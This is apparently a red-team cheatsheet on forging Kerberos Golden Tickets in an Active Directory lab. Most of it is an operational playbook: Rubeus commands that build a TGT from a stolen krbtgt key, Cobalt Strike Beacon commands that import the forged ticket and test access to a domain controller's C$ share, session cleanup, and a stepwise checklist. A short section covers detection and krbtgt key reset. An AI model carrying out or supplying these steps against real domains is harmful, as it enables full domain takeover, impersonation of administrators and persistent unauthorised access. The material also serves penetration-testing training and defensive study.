---
title: "Kerberos Golden Tickets"
description: "Build a TGT using the compromised krbtgt key, import it, and distinguish TGT forgery from normal service-ticket requests."
category: "Domain Dominance"
tools: ["Cobalt Strike", "Rubeus", "Kerbeus BOF"]
updated: 2026-11-16
tags: ["domain-dominance", "kerberos", "golden-ticket", "ticket-forgery"]
draft: false
---

## 1. Why the attack works

A Golden Ticket is a TGT forged with the domain's `krbtgt` key. Because that key protects TGTs, the forged ticket can be presented to the KDC to request service tickets under the represented identity.

Unlike a Silver Ticket, it is not tied to one service's key. Access to services still passes through KDC validation and service authorization; key possession is not a reason to ignore account, PAC or policy checks.

| Requirement | Source in the notes |
|---|---|
| `krbtgt` key | DCSync with replication rights |
| Domain SID | Domain identifier without the account RID |
| Username and RID | Directory identity being represented |
| Group RIDs | The intended authorization data, not arbitrary tool defaults |

## 2. Forge the TGT

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:<KRBTGT_AES256_KEY> /user:Administrator /id:500 /groups:513,512 /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
# Output: a TGT for Administrator, in base64.
```

The domain SID does not include `krbtgt`'s RID `502` or Administrator's RID `500`. Identity and group values shown here belong to the lab. Review generated lifetimes rather than assuming that a tool's defaults match domain policy.

## 3. Import the TGT and request a service

```shell
beacon> make_token CONTOSO\Administrator FakePass
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<FORGED_TGT_BASE64>
beacon> run klist
# Confirm Administrator -> krbtgt/CONTOSO.COM.
beacon> ls \\lon-dc-1\c$
beacon> run klist
# If authentication succeeds, expect a service ticket for cifs/lon-dc-1 as well.
```

Windows uses the imported TGT for a normal TGS exchange when the requested service ticket is not already cached. The `C$` access test depends on the represented user's authorization and the target accepting the tickets.

## Ticket import alternatives

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<FORGED_TGT_BASE64>"))
```

```shell
# OPSEC Alternative
beacon> make_token CONTOSO\Administrator FakePass
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
beacon> run klist
beacon> ls \\lon-dc-1\c$
```

```shell
# Rubeus Alternative
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO /username:Administrator /password:FakePass /ticket:<FORGED_TGT_BASE64>
beacon> steal_token <CREATED_PID>
beacon> run klist
beacon> ls \\lon-dc-1\c$
```

## Session cleanup

Purge the disposable network-only session while its token is still selected, then restore Beacon's original token. `rev2self` alone does not purge tickets.

```shell
# Native cleanup
beacon> kerberos_ticket_purge
beacon> rev2self
```

## Troubleshooting and detection

| Symptom | Check |
|---|---|
| KDC rejects the TGT | Correct realm, `krbtgt` key/version, identity fields and clock |
| TGT imports but no useful access | Actual KDC acceptance, target SPN and user permissions |
| Ticket visible in the wrong cache | Effective token and selected network-only logon session |
| Unexpected validity period | Tool arguments, generated fields and domain policy |

A `4769` service-ticket request without a corresponding `4768` TGT request may indicate a forged TGT, but can also reflect caching, different DCs or incomplete logs. Correlate identities, lifetimes and source hosts. A fixed “10 hours / 7 days” policy or a “10-year ticket” is not universal.

Revoking an operator session does not invalidate an extracted `krbtgt` key. Domain recovery must address compromised current and previous `krbtgt` keys through a coordinated reset procedure.

## Quick checklist

```text
BUILD THE TGT
[ ] Obtain the correct domain's krbtgt key and identify its encryption type/version.
[ ] Record the domain SID without an account RID.
[ ] Verify the represented username, user RID and intended group RIDs.
[ ] Rubeus golden -> build the TGT using krbtgt's key.
[ ] Inspect the generated identity, realm and validity fields.
[ ] Confirm the output service is krbtgt/CONTOSO.COM.

IMPORT AND VERIFY — CHOOSE ONE PATH
# OPSEC Alternative
[ ] PowerShell: [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<FORGED_TGT_BASE64>"))
[ ] make_token CONTOSO\Administrator FakePass
[ ] kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
# Rubeus Alternative
[ ] createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<FORGED_TGT_BASE64>
[ ] Record the returned PID and LUID; steal_token <CREATED_PID>.
[ ] run klist -> verify the selected session, client identity, target and expiry.
[ ] ls \\lon-dc-1\c$ -> verify actual service authorization.
[ ] Recheck klist for the service ticket requested using the imported TGT.

CLEANUP
[ ] Purge only the selected disposable cache: krb_purge or kerberos_ticket_purge.
[ ] rev2self -> restore the original token.
[ ] Rubeus createnetonly path only: kill <CREATED_PID>.
```

## Related references

- [DCSync](/cheatsheets/dcsync-cheatsheet/)
- [Silver Tickets](/cheatsheets/silver-ticket-cheatsheet/)
- [Diamond Tickets](/cheatsheets/diamond-ticket-cheatsheet/)
- [Rubeus](https://github.com/GhostPack/Rubeus)
